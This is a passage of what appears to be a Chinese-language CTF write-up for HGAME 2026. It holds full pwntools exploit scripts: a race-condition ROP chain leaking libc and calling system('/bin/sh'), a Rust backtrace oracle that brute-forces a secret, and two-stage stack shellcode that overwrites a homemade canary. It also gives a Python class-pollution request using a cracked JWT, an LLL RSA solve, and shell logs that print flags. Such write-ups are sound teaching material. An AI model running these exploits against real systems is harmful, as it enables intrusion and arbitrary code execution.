LEAVE_RET = 0x401818
RET       = 0x401819  # 单独的 ret（用于栈对齐）

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

def find_main_addr(e: ELF) -> int:
    """
    从 _start 里解析 main：
    4012f1: 48 c7 c7 1a 18 40 00   mov rdi, 0x40181a
    """
    code = e.read(e.entry, 0x60)
    sig = b"\x48\xc7\xc7"
    i = code.find(sig)
    if i == -1:
        # 兜底：直接用题目分析得到的 main
        return 0x40181a
    return u32(code[i+3:i+7])

MAIN = find_main_addr(elf)

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    # 本地用题目给的 ld + libc 跑（最稳）
    return process([LD, "--library-path", ".", BIN])

def choose(io, n: int):
    # 菜单提示符是：input your choice>>
    io.recvuntil(b"input your choice>>", timeout=10)
    io.sendline(str(n).encode())

def recv_gift(io) -> int:
    io.recvuntil(b"a gift for you:", timeout=10)
    line = io.recvline(timeout=10).strip()
    return int(line, 16)

def produce_fast(io, qword: int):
    """
    只负责发起 producer（pthread_create 之后立刻回到菜单），
    不等待 'has been produced'，用于最后 burst 触发竞态。
    """
    choose(io, 1)
    io.recvuntil(b"input the data you want to produce:", timeout=10)
    io.send(p64(qword))

def produce_wait(io, qword: int):
    """
    发起 producer 并等待它打印完成行（单线程阶段用，保证 idx 确实推进）
    """
    produce_fast(io, qword)
    io.recvuntil(b"has been produced.\n", timeout=15)
    # 打印后还有 sleep(1) 才会更新 prod_idx，所以再等一等保证下一次 produce 读到新 idx
    time.sleep(1.25)

def consume_wait(io):
    choose(io, 2)
    io.recvuntil(b"Consumer has consumed", timeout=15)
    io.recvuntil(b"\n", timeout=15)

def exit_menu(io):
    choose(io, 3)

def build_stage1(buf_addr: int):
    """
    fake stack (10 qwords, 0x50 bytes)
    q[8] -> 覆盖 saved RBP
    q[9] -> 覆盖 saved RIP
    """
    q = [0] * 10
    q[0] = 0xdeadbeefdeadbeef
    q[1] = POP_RDI
    q[2] = PUTS_GOT
    q[3] = PUTS_PLT
    q[4] = MAIN
    q[8] = buf_addr
    q[9] = LEAVE_RET
    return q

def build_stage2(buf_addr: int, libc_base: int):
    system = libc_base + libc.sym["system"]
    binsh  = libc_base + next(libc.search(b"/bin/sh\x00"))

    q = [0] * 10
    q[0] = 0x0
    q[1] = POP_RDI
    q[2] = binsh
    q[3] = RET        # 对齐，避免部分环境 system 崩
    q[4] = system
    q[8] = buf_addr
    q[9] = LEAVE_RET
    return q

def fill_and_make_prodidx_10(io, qwords):
    """
    关键：让 prod_idx 最终变成 10，从而 exit 后 memcpy 长度 = 10*8 = 0x50 覆盖 RIP。
    做法：
      - 先“顺序完成”写 0..6（每个 producer 等待完成 + sleep 确保 idx 更新）
      - 再 burst 连开 3 个 producer（让它们都在 idx==7 的检查期通过）
        利用内部 sleep(1)+循环 sleep 值，让三个线程在写入时分别读到 idx=7/8/9
      - 等 3 条 produced 输出，再额外 sleep 等最后一次 idx 更新到 10
    """
    assert len(qwords) == 10

    # 写 0..6：严格串行
    for i in range(7):
        produce_wait(io, qwords[i])
        consume_wait(io)

    # burst：三次快速 produce（间隔拉大一点，让三个线程写入时能跨过前一个线程的 idx 更新）
    produce_fast(io, qwords[7])
    time.sleep(0.6)
    produce_fast(io, qwords[8])
    time.sleep(0.6)
    produce_fast(io, qwords[9])

    # 等这三条 produced 输出（说明写入+打印完成；之后还有 sleep(1) 才更新 idx）
    for _ in range(3):
        io.recvuntil(b"has been produced.\n", timeout=30)

    # 等最后一个线程完成 idx 更新到 10
    time.sleep(1.5)

def leak_libc_puts(io) -> int:
    """
    exit 后 main 会：
      write("buffer data:", 0xc) + write(buffer, 0x40)
    然后我们的 ROP puts(puts@got) 输出“GOT里的8字节地址当字符串” + '\n'
    随后回到 main，puts("WELCOME TO HGAME2026!\n")
    我们读到 WELCOME 之前的所有数据，去掉最后那个 puts 自带的 '\n'，剩下就是泄露字节。
    """
    io.recvuntil(b"buffer data:", timeout=10)
    io.recvn(0x40, timeout=10)  # 丢掉 buffer dump

    pre = io.recvuntil(b"WELCOME TO HGAME2026!", drop=True, timeout=10)
    if pre.endswith(b"\n"):
        leak_bytes = pre[:-1]
    else:
        leak_bytes = pre

    leaked_puts = u64(leak_bytes.ljust(8, b"\x00"))
    log.success(f"leaked puts = {hex(leaked_puts)}")

    libc_base = leaked_puts - libc.sym["puts"]
    log.success(f"libc base   = {hex(libc_base)}")
    return libc_base

def main():
    io = start()

    # -------- stage 1: leak libc --------
    gift = recv_gift(io)
    buf  = gift + 0x1800
    log.info(f"gift = {hex(gift)} / buffer = {hex(buf)}")
    log.info(f"MAIN = {hex(MAIN)}")

    q1 = build_stage1(buf)
    fill_and_make_prodidx_10(io, q1)
    exit_menu(io)

    libc_base = leak_libc_puts(io)

    # -------- stage 2: system('/bin/sh') --------
    gift2 = recv_gift(io)
    buf2  = gift2 + 0x1800
    log.info(f"gift2 = {hex(gift2)} / buffer2 = {hex(buf2)}")

    q2 = build_stage2(buf2, libc_base)
    fill_and_make_prodidx_10(io, q2)
    exit_menu(io)

    io.interactive()

if __name__ == "__main__":
    main()

```

最终flag

```
    b'3.exit.\n'
    b'input your choice>>'
[DEBUG] Received 0x1a bytes:
    b'Data 7 has been produced.\n'
[DEBUG] Received 0x1a bytes:
    b'Data 8 has been produced.\n'
[DEBUG] Received 0x1a bytes:
    b'Data 9 has been produced.\n'
[DEBUG] Sent 0x2 bytes:
    b'3\n'
[*] Switching to interactive mode
[DEBUG] Received 0xc bytes:
    b'buffer data:'
buffer data:[DEBUG] Received 0x40 bytes:
    00000000  00 00 00 00  00 00 00 00  63 19 40 00  00 00 00 00  │····│····│c·@·│····│
    00000010  bd 75 b0 bd  23 7f 00 00  19 18 40 00  00 00 00 00  │·u··│#···│··@·│····│
    00000020  90 52 9a bd  23 7f 00 00  00 00 00 00  00 00 00 00  │·R··│#···│····│····│
    00000030  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│
    00000040
\x00\x00\x00\x00\x00\x00\x00\x00c\x19@\x00\x00\x00\x00\x00\xbdu\xb0\xbd#\x7f\x00\x00\x19\x18@\x00\x00\x00\x00\x00\x90R\x9a\xbd#\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$   l                                                                                                                       ls                                                                                                                      ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x28 bytes:
    b'bin\n'
    b'dev\n'
    b'flag\n'
    b'lib\n'
    b'lib32\n'
    b'lib64\n'
    b'libx32\n'
    b'pwn\n'
bin
dev
flag
lib
lib32
lib64
libx32
pwn
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x29 bytes:
    b'hgame{yOu_fOUNd_ThE_dEcOmP0S3R117ea2ef9}\n'
hgame{yOu_fOUNd_ThE_dEcOmP0S3R117ea2ef9}
$
```

## **steins;gate**

### 1. 解题思路

#### 1.1 题目现象与输入约束

远程连上后只会不断提示一行 `:` 等你输入。输入不满足要求会输出：

- `incorrect length`：长度不对
- 或触发 Rust panic 并打印 backtrace（你贴出来的那种）

从交互可以推断程序要求输入必须是**固定长度的 hex 字符串**（常见为 128 字符），内部会把 hex 解码成 **64 字节**，然后调用 `guess::verify` 校验；校验失败就 `panic!("explicit panic")`，而远程环境开启了 backtrace，所以会把 `guess::verify` 的地址打印出来：

```
... 0x55xxxxxxx64b7 - guess::verify::h...
```

#### 1.2 核心漏洞：Backtrace 地址泄露 = “第一个不匹配字节位置”的 oracle

`verify` 的比较逻辑是按字节从前往后比：

- 第 0 字节不等 → 走到 handler0 → panic
- 第 1 字节不等 → handler1 → panic
- …
- 第 63 字节不等 → handler63 → panic

这些 handler 在汇编里是**重复结构的 64 个分支块**。
 关键点：Rust backtrace 打印出来的 `guess::verify` 地址，落在**某个 handler 内部（更准确说是 handler 内调用 panic 的返回地址）**，因此这个地址可以被映射为 “第一个不匹配的字节下标”。

于是我们就有了一个 oracle：

> 给一个 64 字节猜测 `G`，程序告诉你 `G` 第一个不匹配的位置 `pos`。

#### 1.3 利用方式：逐字节爆破 64 字节 secret（hash）

目标 secret 为 64 bytes（对应 128 hex）。
 已知前缀 `known`，爆破第 `i` 个字节：

1. 枚举 `cand = 0..255`
2. 构造：`guess = known + [cand] + [0x00] * (63-i)`
3. 发送 `guess.hex()`（128 字符）
4. 解析 backtrace 得到 `mp = mismatch_pos`
   - 若 `mp > i`，说明前 `i` 字节都对了（第一个不匹配在更后面），于是 `cand` 就是正确字节。

重复 64 次得到完整 64 字节 secret。
 最后把完整 hex 再提交一次，程序进入 shell（你这里已经拿到 `$`），然后 `cat flag` 即可。

------

2. ### 解题脚本

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import re
import time

context(os="linux", arch="amd64")
context.log_level = "info"

HOST, PORT = "cloud-middle.hgame.vidar.club", 30963
BIN = "./vuln3"

elf = ELF(BIN, checksec=False)

# Rust 符号：_ZN5guess6verify17h....E
verify_sym = next(s for s in elf.symbols if "guess6verify" in s)
VERIFY_OFF = elf.symbols[verify_sym]

re_verify = re.compile(rb"0x([0-9a-fA-F]+)\s+-\s+guess::verify")

def build_retaddr_map():
    """
    verify 结构是 64 次：
        cmp byte[i]
        jne handler_i
    handler_i 内会：
        mov [rsp+4], i
        ...
        call panic_helper   ; 这是 noreturn
    Rust backtrace 打印在 verify 帧里的地址，是这个 call 的“返回地址”
    （即 call 下一条指令地址），不是 handler 起始地址。

    所以我们需要构造：retaddr(call_next) -> i
    """
    # 1) 找到 64 个 handler 入口（jne rel32 目标）
    code = elf.read(VERIFY_OFF, 0x2000)
    handler_starts = []
    i = 0
    while i + 6 <= len(code) and len(handler_starts) < 64:
        if code[i] == 0x0f and code[i+1] == 0x85:  # jne rel32
            rel = u32(code[i+2:i+6])
            if rel & 0x80000000:
                rel -= 0x100000000
            target = VERIFY_OFF + i + 6 + rel
            handler_starts.append(target)
            i += 6
        else:
            i += 1

    if len(handler_starts) != 64:
        log.warning(f"found {len(handler_starts)} handlers (expected 64), still try.")

    # 2) 在每个 handler 内找 call 指令 (ff 15 disp32)，用其 next RIP 作为 retaddr
    ret2idx = {}
    for idx, h in enumerate(handler_starts):
        blk = elf.read(h, 0x60)
        pos = blk.find(b"\xff\x15")
        if pos == -1:
            raise ValueError(f"cannot find call in handler {idx} at {hex(h)}")
        retaddr = h + pos + 6  # ff 15 disp32 长度 6
        ret2idx[retaddr] = idx

    return ret2idx

RET2IDX = build_retaddr_map()
RET_LIST = sorted(RET2IDX.keys())

def start():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process(BIN, env={"RUST_BACKTRACE": "1"})
    # 初始提示符是单独一行 ":"
    io.recvuntil(b":\n", timeout=10)
    return io

def oracle(io, guess_hex: str) -> int:
    """
    发送 128 hex（会被程序 decode 成 64 bytes），返回第一个不匹配 byte 下标 (0..63)。
    若完全匹配（不 panic / 直接输出 flag），返回 64。
    """
    assert len(guess_hex) == 128
    io.sendline(guess_hex.encode())

    # 一次性读到下一次 prompt：最后两行一定是 "\n:\n"
    data = io.recvuntil(b"\n:\n", timeout=30)
    body = data[:-3]

    m = re_verify.search(body)
    if not m:
        # 没 backtrace（可能正确，或输出变化）
        return 64

    addr = int(m.group(1), 16)

    # PIE base page-align 还原（verify 内偏移 < 0x1000）
    base = (addr - VERIFY_OFF) & ~0xfff
    off = addr - base  # 变成二进制内偏移，如 0x184b7

    # backtrace 给的是 retaddr，我们用最近匹配（一般是精确命中）
    nearest = min(RET_LIST, key=lambda x: abs(x - off))
    if abs(nearest - off) > 0x10:
        raise ValueError(f"retaddr miss: off={hex(off)} nearest={hex(nearest)}")
    return RET2IDX[nearest]

def main():
    io = start()

    known = bytearray()

    overall = log.progress("overall")
    overall.status("starting...")

    for i in range(64):
        prog = log.progress(f"byte[{i:02d}]")
        prog.status(f"prefix={known.hex()}")

        found = None
        for cand in range(256):
            if cand % 16 == 0:
                prog.status(f"prefix={known.hex()}  trying 0x{cand:02x}..0x{min(cand+15,255):02x}")

            guess = known + bytes([cand]) + b"\x00" * (63 - i)

            try:
                mp = oracle(io, guess.hex())
            except Exception as e:
                # 断线/超时/解析异常：重连继续（不会丢 prefix）
                prog.status(f"reconnect because: {e}")
                try:
                    io.close()
                except:
                    pass
                io = start()
                continue

            # mp 是“第一个不匹配的位置”
            if mp > i:
                found = cand
                known.append(cand)
                prog.success(f"found 0x{cand:02x}  prefix={known.hex()}")
                break

        if found is None:
            prog.failure("failed")
            overall.failure("failed")
            try:
                io.close()
            except:
                pass
            return

        overall.status(f"{i+1}/64 bytes done")

    overall.success("all bytes recovered")
    final_hex = known.hex()
    log.success(f"Recovered 64 bytes: {final_hex}")

    # 提交最终答案
    io.sendline(final_hex.encode())
    io.interactive()

if __name__ == "__main__":
    main()

```

```
[+] e716e2ac2824e
[+] Recovered 64 bytes: 631886c1b685f384809db61233f337d66c313ec23a3338cb5b58cbadbae386eb4752e8cb517e86de7571c15b81ff64f91f28ebdf60c62c455fbe716e2ac2824e
[*] Switching to interactive mode
/bin/sh: 1: 631886c1b685f384809db61233f337d66c313ec23a3338cb5b58cbadbae386eb4752e8cb517e86de7571c15b81ff64f91f28ebdf60c62c455fbe716e2ac2824e: not found
$ ls
bin
boot
dev
etc
flag
flag_hash
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
$ cat flag
hgame{B@CKtrace-is-tHe-key1952aff561}
$
```

## **adrift**

### 解题思路

#### 1.1 保护与利用方向

`checksec vuln4`：

- **PIE enabled**：代码地址随机，但本题不需要 ret2libc/rop（可执行栈 + shellcode）
- **No canary found**：没有系统栈保护，但题目实现了“自制 canary”
- **Stack Executable / RWX segments**：栈可执行，适合直接打 **shellcode**
- **Full RELRO / SHSTK / IBT**：GOT 不好改，但我们也不走 GOT 劫持

所以核心打法是：**绕过自制 canary → 栈溢出 → ret 到栈上 shellcode → read 二阶段 shellcode → getshell**。

------

#### 1.2 关键漏洞 1：`abs(INT16_MIN)` 溢出绕过 index 检查

程序对 `index` 做了“取绝对值 + 范围检查”，但 index 存在 **16 位溢出**：

- `-32768` 的 16 位表示是 `0x8000`
- `abs(-32768)` 在 16 位里仍是 `0x8000`（溢出）
- 最终 signed 比较时 `-32768` **不会大于** 200，于是通过检查

因此我们能访问一个“看似越界但被绕过”的下标：**index = -32768**。

------

#### 1.3 关键漏洞 2：全局数组与 canary 的布局刚好差 0x40000

程序维护一个全局数组 `dis[]`（每项 8 字节），以及一个全局变量 `canary`。

题目非常刻意地把它们放在 `.bss`，并满足：

```
&dis - &canary = 0x40000
0x40000 / 8 = 0x8000 = 32768
```

所以：

> ```
> dis[-32768]` **正好指向** `canary
> ```

于是我们得到两件事：

- `show(-32768)` 可以**泄露 canary**
- `edit(-32768, x)` 可以**改写 canary**

------

#### 1.4 自制 canary 的绕过方式

程序的“伪 canary”逻辑大概是：

1. 程序启动时把一个值存到全局 `canary`
2. main 里把 `canary` 复制到栈上的某个位置 `rbp-0x10`
3. 退出（choose=4）时检查：
   `if *(rbp-0x10) != canary -> exit(0)`

而我们的溢出会改到 `rbp-0x10`，导致比较失败直接退出。

解决办法：**先用 edit(-32768) 把全局 canary 改成“我们溢出后 rbp-0x10 的实际内容”**。
 这样退出时比较必然相等，成功通过检查并 `leave; ret`。

------

#### 1.5 关键漏洞 3：add 分支的 read 溢出 + memset 清空

在 `choose=0` 的分支里：

- `read(0, buf+6, 0x410)` —— buf 只有 0x400，而且从 +6 开始读，必溢出到 saved RIP
- 随后 `memset(buf+6, 0, 0x3e8)` —— 会清掉前 0x3e8 字节

这意味着：

- shellcode 不能放在 buf 前面（会被清掉）
- 但 `rbp-0x12` 附近（清空区之后的尾部）不会被 memset 覆盖
  → 我们把 **stage1 shellcode** 放到 `rbp-0x12`，再把返回地址改到那里。

------

#### 1.6 最终利用链（两阶段 shellcode）

1. `show(-32768)` 泄露全局 canary（也是栈地址，用来推算 rbp）
2. 根据泄露值计算 `main_rbp`，进而确定 `stage1` 放置地址 `rbp-0x12`
3. 构造极短 **stage1**（不超过尾部可用空间），它做：
   - `read(0, rsp-0x300, 0x100)`
   - `jmp rsp-0x300`
4. `edit(-32768, new_canary)` 把全局 canary 改成 **stage1 中会覆盖到 rbp-0x10 的 8 字节**
5. `choose=0` 发送溢出 payload，覆盖 saved RIP → `rbp-0x12`
6. `choose=4` 触发返回进入 stage1
7. 发送 stage2（标准 `/bin/sh` shellcode）→ getshell → `cat flag`

### 解题脚本

```
#!/usr/bin/env python3
from pwn import *
import struct

context(os="linux", arch="amd64")
context.log_level = "debug"

HOST, PORT = "cloud-middle.hgame.vidar.club", 31927
BIN = "./vuln4"

# ---------- helpers ----------
def wait_choose(io):
    io.recvuntil(b"choose> ")

def cmd(io, c: int):
    wait_choose(io)
    io.sendline(str(c).encode())

def show(io, idx: int) -> int:
    cmd(io, 2)
    io.recvuntil(b"index> ")
    io.sendline(str(idx).encode())
    line = io.recvline()  # b": <num>\n"
    if b":" not in line:
        raise ValueError("show parse failed: " + repr(line))
    return int(line.split(b":", 1)[1].strip())

def edit(io, idx: int, val_signed: int):
    cmd(io, 3)
    io.recvuntil(b"index> ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"a new distance> ")
    io.sendline(str(val_signed).encode())

def add_overflow(io, payload: bytes, dist: int = 1):
    cmd(io, 0)
    io.recvuntil(b"way> ")
    io.send(payload)                 # read(0, ..., 0x410)
    io.recvuntil(b"distance> ")
    io.sendline(str(dist).encode())

def exit_prog(io):
    cmd(io, 4)

def u64(b):
    return struct.unpack("<Q", b)[0]

def to_signed(x_u64: int) -> int:
    return x_u64 - (1 << 64) if x_u64 >= (1 << 63) else x_u64

# ---------- exploit ----------
def main():
    io = remote(HOST, PORT) if args.REMOTE else process(BIN)
    log.info("connected (%s)" % ("REMOTE" if args.REMOTE else "LOCAL"))

    # 1) leak original canary (stack addr) via dis[-32768]
    log.info("[1/5] leak original canary with show(-32768)")
    leak = show(io, -32768)
    log.success(f"leaked canary = {hex(leak)}")

    # from disassembly: canary = main_rbp - 0x418
    rbp = leak + 0x418
    stage1_addr = rbp - 0x12
    log.info(f"main_rbp     = {hex(rbp)}")
    log.info(f"stage1_addr  = {hex(stage1_addr)}")

    # 2) build stage1 (must fit before saved RIP; 21 bytes is fine)
    # read(0, rsp-0x300, 0x100); jmp rsi
    stage1 = asm(r"""
        xor eax, eax
        xor edi, edi
        lea rsi, [rsp-0x300]
        mov edx, 0x100
        syscall
        jmp rsi
    """)
    assert len(stage1) == 21
    log.success(f"stage1 len = {len(stage1)}")

    # 3) set GLOBAL canary to equal the 8 bytes that will sit at [rbp-0x10]
    # stage1 starts at rbp-0x12, so rbp-0x10 corresponds to stage1[2:10]
    new_canary = u64(stage1[2:10])
    new_canary_signed = to_signed(new_canary)
    log.info("[2/5] patch global canary via edit(-32768, new_canary)")
    log.info(f"new_canary(u64) = {hex(new_canary)}  signed = {new_canary_signed}")
    edit(io, -32768, new_canary_signed)
    log.success("global canary patched")

    # 4) craft overflow payload
    # main has: sub rsp,0x400
    # read into [rbp-0x400+6] == [rbp-0x3fa], size 0x410
    # memset clears 0x3e8 bytes from [rbp-0x3fa] to [rbp-0x13]
    # so [rbp-0x12 ..] survive -> put stage1 at rbp-0x12
    off_stage1 = 0x3e8          # (rbp-0x12) - (rbp-0x3fa)
    off_saved_rip = 0x402       # (rbp+8)    - (rbp-0x3fa)

    payload  = b"A" * off_stage1
    payload += stage1

    if len(payload) > off_saved_rip:
        raise RuntimeError("stage1 overlaps saved RIP unexpectedly")

    payload += b"B" * (off_saved_rip - len(payload))
    payload += p64(stage1_addr)         # saved RIP
    payload  = payload.ljust(0x410, b"C")

    log.success(f"payload length = {len(payload)}")

    # 5) trigger overflow then exit to jump
    log.info("[3/5] trigger overflow via choose=0")
    add_overflow(io, payload, dist=1)

    log.info("[4/5] choose=4 to return into stage1")
    exit_prog(io)

    # stage1 is now doing read(0, rsp-0x300, 0x100)
    # send stage2 padded to 0x100 to avoid blocking
    stage2 = asm(shellcraft.sh())
    log.info(f"[5/5] send stage2 ({len(stage2)} bytes) padded to 0x100")
    io.send(stage2.ljust(0x100, b"\x90"))

    log.success("got shell (if everything ok)")
    io.interactive()

if __name__ == "__main__":
    main()

```

flag

```
$ cat flag
[DEBUG] Sent 0x9 bytes:
    b'cat flag\n'
[DEBUG] Received 0x23 bytes:
    b'hgame{yOu_FOUNd_It:)30605bcc4078d}\n'
hgame{yOu_FOUNd_It:)30605bcc4078d}
$
```

## **Vidarshop**

爆破jwt发现密钥是111

名字改admin，is_admin还是不对

结合题目提示uid猜测是需要合适的uid，直接爆破uid没得到有用结果（ps：开始注册用户名是a，所以uid成1了，以为是按顺序的admin是0

多注册几个用户名，发现uid是按名字英文字母转数字拼接来的，

最后直接python原型链污染全局变量即可

```
POST /api/update HTTP/1.1
Host: cloud-middle.hgame.vidar.club:30220
Content-Length: 87
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxODAxNzEyNjkyfQ.FzJa7taRPDyuSyL-q84UMAtX0diTkfakUOfGJrfLD5Y
Accept-Language: zh-CN,zh;q=0.9
uid: 1413914
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: */*
Origin: http://cloud-middle.hgame.vidar.club:30220
Referer: http://cloud-middle.hgame.vidar.club:30220/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{
    "__init__": {
        "__globals__": {
 "balance":1000000
        }
    }
}
```

## **babyRSA**

猜测是要用LLL解法，提示ai用lll然后如下

这题的“坑点”不在分解 (n)（你甚至已经拿到了 (p,q)），而在于 **明文 (m) 比模数 (n) 大**：

- 加密做的是 (c \equiv m^e \pmod n)
- 解密只能得到 (r = c^d \bmod n = m \bmod n)
- 真正的明文满足 (m = r + t\cdot n)，但 (t) 的范围巨大，不能爆破。

关键数据特征（为什么 LLL 能做）

1. flag 结构强：
   [
   m = \texttt{"VIDAR{"} ,|, u_0u_1\dots u_{k-1} ,|, \texttt{"}"}
   ]
   其中 (k\in[30,40])，每个 (u_i) 来自 **64 个字符集**（digits+letters+`_@`），对应 ASCII 值大约在 ([48,122])，**系数很小**。
2. 写成“模 (n) 的线性同余”（这是 LLL 入口）
   设总长度 (L=k+7)。把字节按大端展开，未知段满足：
   [
   \sum_{i=0}^{k-1} u_i\cdot 256^{k-i} \equiv R \pmod n
   ]
   其中
   [
   R \equiv r - \text{bytes_to_long}(\texttt{"VIDAR{"})\cdot 256^{k+1} - \text{ord}(\texttt{"}"}) \pmod n
   ]
   令
   [
   a_i \equiv 256^{k-i}\pmod n
   ]
   就得到典型的“**模 (n) 的小系数线性组合**”：
   [
   \sum u_i a_i - R = t\cdot n
   ]
3. 为了让 LLL 更稳：把 (u_i) 平移到 0 附近
   选一个中心值（比如 `base=85`），令 (u_i=v_i+\text{base})，则 (v_i) 大概在 ([-40,40])：
   [
   \sum v_i a_i \equiv R - \text{base}\cdot\sum a_i \pmod n
   ]
4. LLL 格子怎么构造（核心）
   构造维度 (k+2) 的格，基向量（按“行”给出）：

- (b_0=(n,0,0,\dots,0,0))
- (b_{i+1}=(a_i,0,\dots,1,\dots,0,0))（第 (i+1) 个位置是 1）
- (b_{k+1}=(R',0,0,\dots,0,1))（embedding）

那么若存在解 ({v_i},t)，向量
[
t b_0+\sum v_i b_{i+1}-1\cdot b_{k+1} = (0, v_0,\dots,v_{k-1},-1)
]
会非常短（因为 (v_i) 很小且最后一维固定 (\pm1)），LLL 很容易把它“吐出来”。
最后把 (u_i=v_i+\text{base}) 还原成字节并校验字符集 + RSA 复验即可。

------

### 解题脚本（推荐 SageMath，LLL 稳且快）

> 直接保存为 `solve.sage`，用 `sage -python solve.sage` 跑。
> （也能在纯 Sage 环境跑；如果你喜欢纯 Python，把 LLL 换成 `fpylll` 即可。）

```python
#!/usr/bin/env sage -python
from sage.all import *
from Crypto.Util.number import bytes_to_long, long_to_bytes, inverse
import string

# ====== given ======
c = 451420045234442273941376910979916645887835448913611695130061067762180161
p = 722243413239346736518453990676052563
q = 777452004761824304315754169245494387
e = 65537

n = p * q
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

# r = m mod n
r = pow(c, d, n)

alphabet = (string.digits + string.ascii_letters + "_@").encode()
allowed = set(alphabet)

prefix = b"VIDAR{"
prefix_int = bytes_to_long(prefix)
suffix_byte = ord("}")

def centered_mod(x, mod):
    x %= mod
    if x > mod // 2:
        x -= mod
    return x

def try_len(k, base=85):
    """
    unknown part length = k
    u_i in allowed ASCII set
    shift u_i = v_i + base, where v_i small
    """
    # coefficients a_i = 256^(k-i) mod n
    a = [pow(256, k - i, n) for i in range(k)]

    # R = r - prefix*256^(k+1) - '}'  (mod n)
    R = (r - prefix_int * pow(256, k + 1) - suffix_byte) % n

    # target for v_i after shifting
    sum_a = sum(a) % n
    Rv = (R - base * sum_a) % n
    Rv = centered_mod(Rv, n)

    dim = k + 2
    B = Matrix(ZZ, dim, dim)

    # b0
    B[0, 0] = n

    # b_{i+1}
    for i in range(k):
        B[i + 1, 0] = a[i]
        B[i + 1, i + 1] = 1

    # embedding row
    B[dim - 1, 0] = Rv
    B[dim - 1, dim - 1] = 1

    # LLL
    Bred = B.LLL()

    # search short vector (0, v0..vk-1, ±1)
    for row in Bred.rows():
        row = list(row)
        if row[0] != 0:
            continue
        if abs(row[-1]) != 1:
            continue

        # handle sign
        s = -1 if row[-1] == 1 else 1
        v = [s * int(row[i + 1]) for i in range(k)]
        u = [vi + base for vi in v]

        # byte / charset check
        if not all(0 <= ui < 256 and ui in allowed for ui in u):
            continue

        unk = bytes(u)
        flag = prefix + unk + b"}"
        m = bytes_to_long(flag)

        # final RSA verify
        if pow(m, e, n) == c:
            return flag

    return None

for k in range(30, 41):
    ans = try_len(k, base=85)
    if ans:
        print("[+] k =", k)
        print(ans.decode())
        break
else:
    print("[-] not found; try changing base (e.g., 80/90) or use BKZ.")
```

```
(latt) ➜  Crypto sage -python solve.sage
[+] k = 35
VIDAR{Congr@tulations_you_re4lly_konw_RS4}
```